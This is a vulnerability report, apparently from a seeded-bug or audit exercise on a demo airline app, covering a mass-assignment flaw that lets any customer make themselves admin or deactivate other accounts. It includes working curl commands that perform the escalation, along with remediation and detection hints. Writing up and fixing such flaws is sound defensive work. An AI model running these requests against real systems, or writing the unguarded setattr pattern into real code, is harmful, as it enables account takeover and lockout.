# VULN-003 — Mass assignment / privilege escalation on profile update

| Field | Value |
|-------|-------|
| ID | VULN-003 |
| Domain | identity |
| CWE | CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes) |
| OWASP Top 10 (2021) | A01:2021 – Broken Access Control |
| Severity | Critical |
| Location | `backend/app/routers/identity.py:234-259` |
| Introduced by | Workstream 1 — Identity (devin/iberia-identity) |

## Description

`PATCH /api/users/{user_id}` reads the raw request body and applies **every** matching column
to the target user with no allow-list and no ownership/role restriction. A customer can therefore
set `"role": "admin"` or `"is_active": false` on themselves or on any other user, escalating
privileges or locking accounts out.

## Reproduction

```bash
# Log in as an ordinary customer.
TOKEN=$(curl -s -X POST http://127.0.0.1:8000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"customer@iberia.demo","password":"Iberia2026!"}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')

# Escalate self to admin (user id 1).
curl -s -X PATCH http://127.0.0.1:8000/api/users/1 \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"role":"admin"}'
# -> {... "role":"admin" ...}

# Or disable another account entirely.
curl -s -X PATCH http://127.0.0.1:8000/api/users/2 \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"is_active":false}'
```

Expected insecure result: any authenticated user gains admin, or can deactivate/alter arbitrary
accounts.

## Blast radius

Complete horizontal and vertical privilege escalation across the entire user base.

## Intended remediation

Bind the body to a strict schema exposing only `full_name` and `iberia_plus_number`; ignore
`role`/`is_active`/`email`/`password_hash`. Enforce that the caller is the target user (or an
admin) before applying changes.

## Detection hints

* `await request.json()` followed by a `setattr` loop over the ORM model.
* No Pydantic request model on a PATCH endpoint that mutates a user.
